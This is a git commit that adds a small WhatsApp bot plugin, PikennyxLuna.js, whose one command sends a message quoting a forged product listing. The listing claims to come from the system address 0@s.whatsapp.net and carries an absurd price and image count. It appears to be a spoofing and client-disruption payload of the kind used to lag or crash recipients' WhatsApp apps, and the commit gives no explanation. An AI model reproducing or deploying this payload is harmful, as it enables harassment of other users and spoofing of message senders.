a5089fd9cd5219f7b24de10fca884d14315ad502
White <82420216+PikennyW@users.noreply.github.com>
2021-07-01 22:27:05 -0500

    Create PikennyxLuna.js

---
+++ plugins/PikennyxLuna.js
@@ -0,0 +1,39 @@
+> conn.sendMessage(from, "xd🎖️", MessageType.text, {quoted: {key: {                                              
+
+		fromMe: false,                       		participant: `0@s.whatsapp.net`
+
+                },                                       
+
+		message: {                                
+
+			"productMessage": {
+
+                                "product": {
+
+                                        "productImage":{                       
+
+						"mimetype": "image/jpeg",                 
+
+						"jpegThumbnail": fs.readFileSync(`./media/Lenny.jpg`)                   
+
+					},                                               
+
+					"title": `Pike x Luna💕`,
+
+                                        "description": "",
+
+                                        "currencyCode": "SYP",
+
+                                        "priceAmount1000": "999999999999999999",                 
+
+					"retailerId": "",
+
+                                        "productImageCount": 999
+
+                                },                                                  
+
+				"businessOwnerJid": `0@s.whatsapp.net`
+
+                }
+
+		}}})
